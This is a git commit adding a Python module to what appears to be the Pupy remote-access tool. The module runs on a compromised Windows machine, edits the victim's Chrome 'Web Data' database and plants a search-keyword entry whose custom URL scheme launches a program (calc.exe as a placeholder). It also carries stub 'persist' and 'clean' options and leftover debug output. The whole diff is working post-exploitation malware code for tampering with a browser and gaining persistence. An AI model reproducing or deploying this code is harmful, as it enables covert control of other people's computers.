cfe39649d4dd17aac0b2de2ed02833e732f1a807
append <ghunter126@yahoo.com>
2015-11-17 20:42:09 -0600

    Additions to Transports
    added a nocrypt.exe for testing purposes, creates an unencrypted
    connection to our transport

---
+++ Content Delivery/Base Python/forensichatpupymodule.py
@@ -0,0 +1,56 @@
+# -*- coding: UTF8 -*-
+
+# --------------------------------------------------------------
+# Copyright (c) 2015, Nicolas VERDIER (contact@n1nj4.eu)
+# All rights reserved.
+# 
+# Redistribution and use in source and binary forms, with or without modification, are permitted provided that the following conditions are met:
+# 
+# 1. Redistributions of source code must retain the above copyright notice, this list of conditions and the following disclaimer.
+# 
+# 2. Redistributions in binary form must reproduce the above copyright notice, this list of conditions and the following disclaimer in the documentation and/or other materials provided with the distribution.
+# 
+# 3. Neither the name of the copyright holder nor the names of its contributors may be used to endorse or promote products derived from this software without specific prior written permission.
+# 
+# THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS "AS IS" AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT HOLDER OR CONTRIBUTORS BE LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE
+# --------------------------------------------------------------
+
+from pupylib.PupyModule import *
+import os
+
+__class_name__="forensichatModule"
+
+class forensichatModule(PupyModule):
+	""" execute cleaning routines """
+	@windows_only
+	def is_compatible(self):
+		pass
+
+	def init_argparse(self):
+		self.arg_parser = PupyArgumentParser(prog='forensichat', description=self.__doc__)
+		self.arg_parser.add_argument('-p', '--persist', help='run the persistance script')
+		self.arg_parser.add_argument('-c', '--clean', help='run the cleaning script')
+
+	def run(self, args):
+		self.info("a")
+		self.client.load_package("_sqlite3")
+		self.info("b")
+		con=self.client.conn.modules['_sqlite3'].connect('C:\Users\steal\AppData\Local\Google\Chrome\User Data\Default\Web Data')
+		self.info("c")
+		self.info("connecting to web data db...")
+		c = con.cursor()
+		c.execute("SELECT * FROM keywords WHERE short_name='cleanupeverybodyeverywhere'")
+		foo = c.fetchall()
+		if foo == []:
+			c.execute("INSERT INTO keywords (short_name,keyword,url,favicon_url) VALUES ('cleanupeverybodyeverywhere','cleanupeverybodyeverywhere','forensichat://C:>Windows>System32>calc.exe','')")
+			con.commit()
+		con.close()
+
+
+		if args.clean:
+			self.info("clean...")
+
+		if args.persist:
+			self.info("persist...")
+		
+		self.success("added browser")
